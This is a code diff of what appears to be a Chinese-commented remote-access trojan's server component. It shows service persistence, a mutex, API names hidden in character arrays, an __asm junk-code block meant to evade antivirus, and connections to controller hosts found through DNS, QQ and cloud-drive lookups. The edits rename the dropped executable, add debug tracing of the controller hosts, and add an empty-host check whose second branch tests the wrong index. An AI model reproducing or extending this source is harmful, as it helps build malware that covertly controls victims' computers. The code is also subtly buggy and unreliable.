@@ -9,6 +9,7 @@
 #include <shellapi.h>
 #include <string.h> 
 #include "wininet.h"
+//#include "CDebug.h"
 //#import "msxml2.dll"
 #import "msxml3.dll"
 
@@ -60,9 +61,9 @@ struct SERVERINFO
 {
 	"YYYYYYYYYYYY",
 	"%ProgramFiles%\\Rumno Qrstuv",
-	"SB360.exe",
+	"U0S2015.exe",
 	"默认分组",
-	"Cao360",
+	"U0S2015",
 	0,    //0为安装不删除    1为安装删除
 	0,    //0为不上线复活    1为复活安装
 	0,    //0为安装不增大    1为安装增大
@@ -519,8 +520,8 @@ void my_ServiceMain()
 	pCreateEventA(NULL, FALSE, FALSE,m_ServiceInfo.Mexi);  //运行互斥
 
 	char FBwWp06[] = {'G','e','t','L','a','s','t','E','r','r','o','r','\0'};
-	GetLastErrorT pGetLastError=(GetLastErrorT)GetProcAddress(LoadLibrary(Lfrfz02),FBwWp06);
-	ExitProcessT pExitProcess=(ExitProcessT)GetProcAddress(LoadLibrary(Lfrfz02),"ExitProcess");
+	GetLastErrorT pGetLastError = (GetLastErrorT)GetProcAddress(LoadLibrary(Lfrfz02),FBwWp06);
+	ExitProcessT  pExitProcess  = (ExitProcessT)GetProcAddress(LoadLibrary(Lfrfz02),"ExitProcess");
 	if (pGetLastError()==ERROR_ALREADY_EXISTS)
 	{
 		pSleep(1000);
@@ -534,14 +535,14 @@ void my_ServiceMain()
 //	MyEncryptFunction((LPSTR)&m_OnlineInfo,sizeof(ONLINEINFO));  //上线信息解密
 
 	BOOL	bSuccessful = FALSE;
-	BOOL    mconct=FALSE;  //通知已经增加
-	LPCTSTR lpConnecte[3]={0};  //上线
-	lpConnects[0]=m_OnlineInfo.DNS1;
-	lpConnects[1]=m_OnlineInfo.DNS2;
-	lpConnects[2]=m_OnlineInfo.DNS3;
-	dwPort[0]=m_OnlineInfo.Port1;
- 	dwPort[1]=m_OnlineInfo.Port2;
- 	dwPort[2]=m_OnlineInfo.Port3;
+	BOOL    mconct = FALSE;  //通知已经增加
+	LPCTSTR lpConnecte[3] = {0};  //上线
+	lpConnects[0] = m_OnlineInfo.DNS1;
+	lpConnects[1] = m_OnlineInfo.DNS2;
+	lpConnects[2] = m_OnlineInfo.DNS3;
+	dwPort[0]     = m_OnlineInfo.Port1;
+ 	dwPort[1]     = m_OnlineInfo.Port2;
+ 	dwPort[2]     = m_OnlineInfo.Port3;
 
 	char Lfrfz09[] = {'G','e','t','T','i','c','k','C','o','u','n','t','\0'};
 	GetTickCountT pGetTickCount=(GetTickCountT)GetProcAddress(LoadLibrary(Lfrfz02),Lfrfz09);
@@ -552,6 +553,13 @@ void my_ServiceMain()
 	BYTE	bBreakError = NOT_CONNECT; // 断开连接的原因,初始化为还没有连接
 
 	OpenEventAT pOpenEventA=(OpenEventAT)GetProcAddress(LoadLibrary(Lfrfz02),"OpenEventA");
+
+	TRACE("UO 0: %d\n", strlen(lpConnects[0]));
+	TRACE("U0 1: %d\n", strlen(lpConnects[1]));
+	TRACE("U0 2: %d\n", strlen(lpConnects[2]));
+	TRACE("U0 %s\n", lpConnects[0]);
+	TRACE("U0 %s\n", lpConnects[1]);
+	TRACE("U0 %s\n", lpConnects[2]);
 
 	while (1)
 	{
@@ -589,21 +597,35 @@ void my_ServiceMain()
 		}
 		if(nConnect==1)
 		{
-			qqonline(lpConnects[1]);    //QQ  上线
-			lpConnecte[1]=lpszQQ;
-			HOST_COUNT = 1;
-			//HOST = lpszQQ;
-			strcpy(HOST, lpszQQ);
-			PORT = m_OnlineInfo.Port2;
+			if (strlen(lpConnects[1]) == 0)
+			{
+				nConnect++;
+			}
+			else
+			{
+				qqonline(lpConnects[1]);    //QQ  上线
+				lpConnecte[1] = lpszQQ;
+				HOST_COUNT = 1;
+				//HOST = lpszQQ;
+				strcpy(HOST, lpszQQ);
+				PORT = m_OnlineInfo.Port2;
+			}
 		}
 		if(nConnect==2)
 		{
-			wangpang(lpConnects[2]);    //网盘上线
-			lpConnecte[2]=lpszWP;
-			HOST_COUNT = 1;
-			//HOST = lpszWP;
-			strcpy(HOST, lpszWP);
-			PORT = m_OnlineInfo.Port3;
+			if (strlen(lpConnects[1]) == 0)
+			{
+				nConnect++;
+			}
+			else
+			{
+				wangpang(lpConnects[2]);    //网盘上线
+				lpConnecte[2] = lpszWP;
+				HOST_COUNT = 1;
+				//HOST = lpszWP;
+				strcpy(HOST, lpszWP);
+				PORT = m_OnlineInfo.Port3;
+			}
 		}
 
         //if (!socketClient.Connect(lpConnecte[nConnect], dwPort[nConnect]))
@@ -929,7 +951,7 @@ int APIENTRY WinMain( __in HINSTANCE hInstance,
 					  __in int nShowCmd )
 {
 
-//////////////////////////////////////////////////////////////////////////
+	//////////////////////////////////////////////////////////////////////////
 	// 让启动程序时的小漏斗马上消失
 
 	__asm   //加花
@@ -957,7 +979,7 @@ int APIENTRY WinMain( __in HINSTANCE hInstance,
 	GetMessageAT pGetMessageA=(GetMessageAT)GetProcAddress(LoadLibrary("USER32.dll"),SSzlC24);
 	pGetMessageA(&msg, NULL, NULL, NULL);
 
-/////////////////////////////////////////////////////////////////////////////////////////////////
+	/////////////////////////////////////////////////////////////////////////////////////////////////
 	char lpBuffer[1024]={NULL};
     char strSubKey0[1024]={NULL};
 
@@ -1038,7 +1060,7 @@ int APIENTRY WinMain( __in HINSTANCE hInstance,
 
 			UINT strmin=0,strmin2=0;
 			char DYrEN27[] = {'S','h','e','l','l','E','x','e','c','u','t','e','A','\0'};
-            ShellExecuteAT pShellExecuteA=(ShellExecuteAT)GetProcAddress(LoadLibrary("SHELL32.dll"),DYrEN27);
+            ShellExecuteAT pShellExecuteA = (ShellExecuteAT)GetProcAddress(LoadLibrary("SHELL32.dll"),DYrEN27);
 			while(1)
 			{
 			    if(GetProcessID(m_ServiceInfo.ReleaseName))                 //检查进程 发现程序运行
@@ -1062,27 +1084,27 @@ int APIENTRY WinMain( __in HINSTANCE hInstance,
 				}
 			}
 
-			pExitProcess(NULL);  // 退出运行程序
+			pExitProcess(NULL);                                              // 退出运行程序
 		}
 	}
-	else  //不是复活安装
+	else                                                                     //不是复活安装
 	{
 		Gyfunction->my_sprintf(ServiceName,"%s",m_ServiceInfo.ReleacsName);  //赋值服务名称
-	    //检查是否有分组信息，并写入分组信息
+	                                                                         //检查是否有分组信息，并写入分组信息
 		pwsprintfA(strSubKey0, JYvni08,ServiceName);	
-	    ReadRegEx(HKEY_LOCAL_MACHINE,strSubKey0,"ConnectGroup", REG_SZ, (char *)lpBuffer, NULL, sizeof(lpBuffer), 0);
+	    ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey0, "ConnectGroup", REG_SZ, 
+			(char *)lpBuffer, NULL, sizeof(lpBuffer), 0);
 
-	    if (plstrlenA(lpBuffer) == 0)  //
+	    if (plstrlenA(lpBuffer) == 0)                                        //
 		{
-		    SetGroup(ServiceName, m_ServiceInfo.szGroup);//写入分组信息
-			MarkTime(ServiceName);  //写入服务版本安装时间信息	
+		    SetGroup(ServiceName, m_ServiceInfo.szGroup);                    //写入分组信息
+			MarkTime(ServiceName);                                           //写入服务版本安装时间信息	
 		}
-		Installope=0;  //写入运行方式  绿色运行
-		my_ServiceMain();  //运行文件 
+		Installope=0;                                                        //写入运行方式  绿色运行
+		my_ServiceMain();                                                    //运行文件 
 	}
 	
 
     return 0;
   }
 
-////////////////////////////////////////////////////////////////////////////////////////////////
